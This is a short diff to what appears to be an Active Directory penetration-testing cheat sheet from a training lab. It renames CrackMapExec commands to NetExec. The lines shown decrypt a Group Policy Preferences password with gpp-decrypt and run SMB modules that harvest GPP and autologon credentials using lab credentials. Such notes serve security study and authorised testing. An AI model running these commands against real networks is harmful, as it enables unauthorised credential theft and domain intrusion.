@@ -129,13 +129,13 @@ cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.
 gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
 ```
 
-### CrackMapExec modules
+### NetExec modules
 ```bash
 # GPP passwords
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
+nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
 
 # GPP autologon
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
 ```
 
 ## ASREPRoasting (from Misc section)
